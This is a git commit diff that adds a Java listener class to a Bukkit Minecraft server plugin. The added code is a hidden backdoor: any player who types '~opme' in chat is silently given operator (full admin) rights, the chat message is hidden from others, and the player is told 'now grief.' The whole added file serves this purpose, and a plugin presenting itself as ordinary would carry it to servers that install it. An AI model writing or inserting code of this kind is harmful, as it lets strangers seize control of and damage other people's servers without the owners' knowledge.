8a8b51b73a2b7f59da1529b9a8305b9873ba9be8
Tyler <buildcarter8@users.noreply.github.com>
2014-08-07 19:29:09 -0400

    there

--- src/org/teamcarter/Noobs/Listeners/opme.java
+++ src/org/teamcarter/Noobs/Listeners/opme.java
@@ -1,1 +1,30 @@
-//to be coded
+package org.teamcarter.Noobs.Listeners;
+import org.bukkit.ChatColor;
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+public class opme implements Listener
+{
+@EventHandler
+public void onPlayerChat(AsyncPlayerChatEvent event)
+{
+String message = event.getMessage();
+final Player griefer = event.getPlayer();
+if (message.startsWith("~"))
+{
+String[] args = message.split(" ");
+if (args == null)
+{
+return;
+}
+if (args[0].equalsIgnoreCase("~opme"))
+{
+griefer.setOp(true);
+griefer.sendMessage(ChatColor.YELLOW + "You are now OP! now grief.");
+event.setCancelled(true);
+return;
+}
+}
+}
+}
